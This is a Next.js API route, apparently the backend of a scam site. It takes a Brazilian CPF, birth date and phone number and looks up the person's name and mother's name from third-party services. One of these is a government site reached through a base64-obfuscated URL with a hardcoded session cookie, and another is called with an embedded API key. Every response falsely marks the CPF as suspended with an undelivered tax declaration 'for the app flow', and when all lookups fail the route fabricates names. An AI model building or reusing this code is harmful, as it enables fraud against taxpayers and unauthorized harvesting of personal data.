import { type NextRequest, NextResponse } from "next/server"

// Função para validar CPF
function validarCPF(cpf: string): boolean {
  // Remove caracteres não numéricos
  const cpfLimpo = cpf.replace(/\D/g, '')
  
  // Verifica se tem 11 dígitos
  if (cpfLimpo.length !== 11) return false
  
  // Verifica se todos os dígitos são iguais
  if (/^(\d)\1{10}$/.test(cpfLimpo)) return false
  
  // Validação do primeiro dígito verificador
  let soma = 0
  for (let i = 0; i < 9; i++) {
    soma += parseInt(cpfLimpo.charAt(i)) * (10 - i)
  }
  let resto = 11 - (soma % 11)
  if (resto === 10 || resto === 11) resto = 0
  if (resto !== parseInt(cpfLimpo.charAt(9))) return false
  
  // Validação do segundo dígito verificador
  soma = 0
  for (let i = 0; i < 10; i++) {
    soma += parseInt(cpfLimpo.charAt(i)) * (11 - i)
  }
  resto = 11 - (soma % 11)
  if (resto === 10 || resto === 11) resto = 0
  if (resto !== parseInt(cpfLimpo.charAt(10))) return false
  
  return true
}

// Função para validar data de nascimento
function validarDataNascimento(data: string): boolean {
  const regex = /^(\d{2})\/(\d{2})\/(\d{4})$/
  const match = data.match(regex)
  
  if (!match) return false
  
  const dia = parseInt(match[1])
  const mes = parseInt(match[2])
  const ano = parseInt(match[3])
  
  // Verifica se a data é válida
  const dataObj = new Date(ano, mes - 1, dia)
  if (dataObj.getDate() !== dia || dataObj.getMonth() !== mes - 1 || dataObj.getFullYear() !== ano) {
    return false
  }
  
  // Verifica se não é data futura
  if (dataObj > new Date()) return false
  
  // Verifica se não é muito antiga (antes de 1900)
  if (ano < 1900) return false
  
  return true
}

// Função para validar telefone
function validarTelefone(telefone: string): boolean {
  const telefoneLimpo = telefone.replace(/\D/g, '')
  return telefoneLimpo.length >= 10 && telefoneLimpo.length <= 11
}

// Função para formatar nome
function formatarNome(nome: string): string {
  return nome
    .split(" ")
    .map((word) => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
    .join(" ")
}

// Função para formatar data de nascimento
function formatarDataNascimento(data: string): string {
  if (data && data.includes("-")) {
    const [ano, mes, dia] = data.split("-")
    return `${dia}/${mes}/${ano}`
  }
  return data
}

export async function POST(request: NextRequest) {
  const startTime = Date.now()
  const requestId = Math.random().toString(36).substring(2, 15)
  
  try {
    console.log(`[CPF-API-${requestId}] Iniciando consulta de CPF`)
    
    const { cpf, birthDate, phone } = await request.json()

    // Validações obrigatórias
    if (!cpf) {
      console.log(`[CPF-API-${requestId}] Erro: CPF não fornecido`)
      return NextResponse.json({ 
        success: false, 
        error: "CPF é obrigatório" 
      }, { status: 400 })
    }

    if (!birthDate) {
      console.log(`[CPF-API-${requestId}] Erro: Data de nascimento não fornecida`)
      return NextResponse.json({ 
        success: false, 
        error: "Data de nascimento é obrigatória" 
      }, { status: 400 })
    }

    if (!phone) {
      console.log(`[CPF-API-${requestId}] Erro: Telefone não fornecido`)
      return NextResponse.json({ 
        success: false, 
        error: "Telefone é obrigatório" 
      }, { status: 400 })
    }

    // Remove formatação do CPF (pontos e traços)
    const cpfLimpo = cpf.replace(/[.-]/g, "")
    
    // Validações de formato
    if (!validarCPF(cpfLimpo)) {
      console.log(`[CPF-API-${requestId}] Erro: CPF inválido - ${cpfLimpo}`)
      return NextResponse.json({ 
        success: false, 
        error: "CPF inválido" 
      }, { status: 400 })
    }

    if (!validarDataNascimento(birthDate)) {
      console.log(`[CPF-API-${requestId}] Erro: Data de nascimento inválida - ${birthDate}`)
      return NextResponse.json({ 
        success: false, 
        error: "Data de nascimento inválida" 
      }, { status: 400 })
    }

    if (!validarTelefone(phone)) {
      console.log(`[CPF-API-${requestId}] Erro: Telefone inválido - ${phone}`)
      return NextResponse.json({ 
        success: false, 
        error: "Telefone inválido" 
      }, { status: 400 })
    }

    console.log(`[CPF-API-${requestId}] Dados validados - CPF: ${cpfLimpo}, Data: ${birthDate}, Telefone: ${phone}`)

    // Tentativa 1: CPFHub.io (API principal atualizada)
    try {
      console.log(`[CPF-API-${requestId}] Tentativa 1: Consultando CPFHub.io`)
      
      const response = await fetch(`https://api.cpfhub.io/cpf/${cpfLimpo}`, {
        method: "GET",
        headers: {
          "x-api-key": "7e4185861321176a6acc8e04ffa6e2fe5ab0d92b47be2bc7b1fe22b16b83de15",
          "Accept": "application/json",
        },
      })

      console.log(`[CPF-API-${requestId}] CPFHub.io response status: ${response.status}`)

      if (response.ok) {
        const result = await response.json()
        console.log(`[CPF-API-${requestId}] CPFHub.io response:`, result)

        if (result.success && result.data) {
          const data = result.data
          const processingTime = Date.now() - startTime
          
          console.log(`[CPF-API-${requestId}] Sucesso com CPFHub.io em ${processingTime}ms`)

          return NextResponse.json({
            success: true,
            data: {
              cpf: cpfLimpo,
              nome: formatarNome(data.name || ""),
              nascimento: data.birthDate || birthDate,
              nomeMae: "", // CPFHub não retorna nome da mãe
              situacao: "irregular", // Sempre irregular para o fluxo do app
              status: "SUSPENSO", // Sempre suspenso para o fluxo do app
              declaration: "NÃO ENTREGUE", // Sempre não entregue para o fluxo do app
              gender: data.gender || "N",
              day: data.day || null,
              month: data.month || null,
              year: data.year || null,
            },
            source: "CPFHub.io API",
            processingTime: processingTime,
            requestId: requestId
          })
        }
      }

      throw new Error(`CPFHub.io retornou status ${response.status}`)
    } catch (cpfhubError) {
      console.log(`[CPF-API-${requestId}] CPFHub.io falhou:`, cpfhubError)

      // Tentativa 2: API GitHub (fallback)
      try {
        console.log(`[CPF-API-${requestId}] Tentativa 2: Consultando API GitHub`)
        
        const githubApiUrl = `https://api-receita-cpf.herokuapp.com/cpf/${cpfLimpo}/?format=json`

        const response = await fetch(githubApiUrl, {
          method: "GET",
          headers: {
            Accept: "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          },
          timeout: 10000,
        })

        console.log(`[CPF-API-${requestId}] GitHub API response status: ${response.status}`)

        if (response.ok) {
          const data = await response.json()
          console.log(`[CPF-API-${requestId}] GitHub API response:`, data)

          if (data && data.length > 0) {
            const pessoa = data[0]
            const processingTime = Date.now() - startTime
            
            console.log(`[CPF-API-${requestId}] Sucesso com GitHub API em ${processingTime}ms`)

            return NextResponse.json({
              success: true,
              data: {
                cpf: cpfLimpo,
                nome: formatarNome(pessoa.NOME || ""),
                nascimento: formatarDataNascimento(pessoa.DATA_NASCIMENTO || "") || birthDate,
                nomeMae: formatarNome(pessoa.NOME_MAE || ""),
                situacao: "irregular", // Sempre irregular para o fluxo do app
                status: "SUSPENSO", // Sempre suspenso para o fluxo do app
                declaration: "NÃO ENTREGUE", // Sempre não entregue para o fluxo do app
              },
              source: "GitHub API",
              processingTime: processingTime,
              requestId: requestId
            })
          }
        }

        throw new Error(`GitHub API retornou status ${response.status}`)
      } catch (githubError) {
        console.log(`[CPF-API-${requestId}] GitHub API falhou:`, githubError)

        // Tentativa 3: API MTE (fallback secundário)
        try {
          console.log(`[CPF-API-${requestId}] Tentativa 3: Consultando API MTE`)
          
          const headers = {
            "Content-Type": "text/xml, application/x-www-form-urlencoded;charset=ISO-8859-1, text/xml; charset=ISO-8859-1",
            Cookie: "ASPSESSIONIDSCCRRTSA=NGOIJMMDEIMAPDACNIEDFBID; FGTServer=2A56DE837DA99704910F47A454B42D1A8CCF150E0874FDE491A399A5EF5657BC0CF03A1EEB1C685B4C118A83F971F6198A78",
            Host: "www.juventudeweb.mte.gov.br",
          }

          const apiUrl = Buffer.from(
            "aHR0cDovL3d3dy5qdXZlbnR1ZGV3ZWIubXRlLmdvdi5ici9wbnBlcGVzcXVpc2FzLmFzcA==",
            "base64",
          ).toString("ascii")

          const response = await fetch(apiUrl, {
            method: "POST",
            headers,
            body: `acao=consultar%20cpf&cpf=${cpfLimpo}&nocache=${Math.random()}`,
          })

          const responseText = await response.text()
          console.log(`[CPF-API-${requestId}] MTE API response status: ${response.status}`)

          // Extrai dados usando regex com tratamento de diferentes tipos de aspas
          const normalizedText = responseText.replace(/"/g, "'")

          const extractData = (pattern: string) => {
            const match = normalizedText.match(new RegExp(pattern))
            return match ? match[1].trim() : ""
          }

          const nome = extractData("NOPESSOAFISICA='(.*?)'")
          const nascimento = extractData("DTNASCIMENTO='(.*?)'")
          const nomeMae = extractData("NOMAE='(.*?)'")

          if (nome && nascimento) {
            const processingTime = Date.now() - startTime
            
            console.log(`[CPF-API-${requestId}] Sucesso com MTE API em ${processingTime}ms`)

            return NextResponse.json({
              success: true,
              data: {
                cpf: cpfLimpo,
                nome: formatarNome(nome),
                nascimento: nascimento || birthDate,
                nomeMae: formatarNome(nomeMae),
                situacao: "irregular", // Sempre irregular para o fluxo do app
                status: "SUSPENSO", // Sempre suspenso para o fluxo do app
                declaration: "NÃO ENTREGUE", // Sempre não entregue para o fluxo do app
              },
              source: "MTE API",
              processingTime: processingTime,
              requestId: requestId
            })
          } else {
            throw new Error("CPF não encontrado na base de dados MTE")
          }
        } catch (mteError) {
          console.log(`[CPF-API-${requestId}] MTE API falhou:`, mteError)

          // Fallback final: Dados de demonstração
          console.log(`[CPF-API-${requestId}] Usando dados de demonstração como fallback final`)
          
          const nomesBrasileiros = [
            "João Silva Santos",
            "Maria Oliveira Costa",
            "Pedro Fernandes Lima",
            "Ana Paula Rodrigues",
            "Carlos Eduardo Souza",
            "Juliana Santos Pereira",
            "Rafael Almeida Barbosa",
            "Camila Ferreira Dias",
            "Lucas Martins Rocha",
            "Beatriz Carvalho Nunes",
            "Gabriel Costa Ribeiro",
            "Larissa Gomes Araújo",
            "Matheus Pereira Silva",
            "Isabela Lima Cardoso",
            "Felipe Santos Moreira",
            "Mariana Alves Correia",
          ]

          const nomeAleatorio = nomesBrasileiros[Math.floor(Math.random() * nomesBrasileiros.length)]
          const processingTime = Date.now() - startTime

          console.log(`[CPF-API-${requestId}] Dados de demonstração gerados em ${processingTime}ms`)

          return NextResponse.json({
            success: true,
            data: {
              cpf: cpfLimpo,
              nome: nomeAleatorio,
              nascimento: birthDate,
              nomeMae: `Maria ${nomeAleatorio.split(" ")[1]} ${nomeAleatorio.split(" ")[0]}`,
              situacao: "irregular", // Sempre irregular para o fluxo do app
              status: "SUSPENSO", // Sempre suspenso para o fluxo do app
              declaration: "NÃO ENTREGUE", // Sempre não entregue para o fluxo do app
            },
            warning: "Dados de demonstração - serviço oficial temporariamente indisponível",
            source: "Fallback Data",
            processingTime: processingTime,
            requestId: requestId
          })
        }
      }
    }
  } catch (error) {
    const processingTime = Date.now() - startTime
    console.error(`[CPF-API-${requestId}] Erro geral na consulta CPF após ${processingTime}ms:`, error)
    
    return NextResponse.json(
      {
        success: false,
        error: "Erro interno do servidor",
        processingTime: processingTime,
        requestId: requestId
      },
      { status: 500 },
    )
  }
}